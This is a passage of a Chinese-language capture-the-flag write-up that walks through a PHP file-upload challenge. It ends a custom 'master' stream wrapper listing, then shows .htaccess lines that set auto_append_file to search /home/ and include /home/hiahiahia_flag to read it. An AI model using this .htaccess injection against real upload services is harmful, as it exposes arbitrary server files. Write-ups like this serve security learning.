			if(str_ireplace($name,'',$v)!==$v)
			{
				echo $v.'</br>';
			}
		}
		
		return 1;
	}
	
	function stream_eof()
	{
		return true;
	}
	function stream_read()
	{
		return '';
	}
	function stream_stat()
	{
		return '';
	}
	
}

stream_wrapper_unregister('php');
stream_wrapper_unregister('phar');
stream_wrapper_unregister('zip');
stream_wrapper_register('master','master');

?>
```

注意到最后几行，查阅资料后知道，`stream_wrapper_unregister`用于关闭php某个协议，而`stream_wrapper_register则是注册某个协议。而里面的参数，分别代表注册协议对应的类和协议名称。协议的格式为：`protocolName://method/[Args]`，而Args格式就是标准URL参数格式：`param1=v1&param2=v2...`，也就是说，经过分析master协议我们可以给出对应的结构。肯定要用的上这个协议，不然就不会题目中给出了。

看到上传文件时的各种处理过程，我们想到.htaccess的控制。这个文件可以加入如下选项：

```
php_value auto_append_file XXX
php_value auto_prepend_file XXX
```

它们用于在解析时，自动给php文件加入页眉和页脚（不影响原php文件），这是在生产中频繁加入header和footer的需求所产生的。结合master协议，我们可以在上传的php文件后面append一些内容。（prepend被过滤了，不好使）

（看了别人的wp，搜索/home/目录，具体是怎么找到的也不太清楚...）

```
php_value auto_append_file master://search/path=%2fhome%2f&name=flag
```

进入`/uploads`文件夹，找到你上传所在的沙箱，就发现了一个叫`hiahiahia_flag`的文件，下一次把它append进去就好了。

```
php_value auto_append_file /home/hiahiahia_flag
```

那么进入`/uploads`文件夹，找到你上传所在的沙箱，就可以从上传处找到附加的flag了。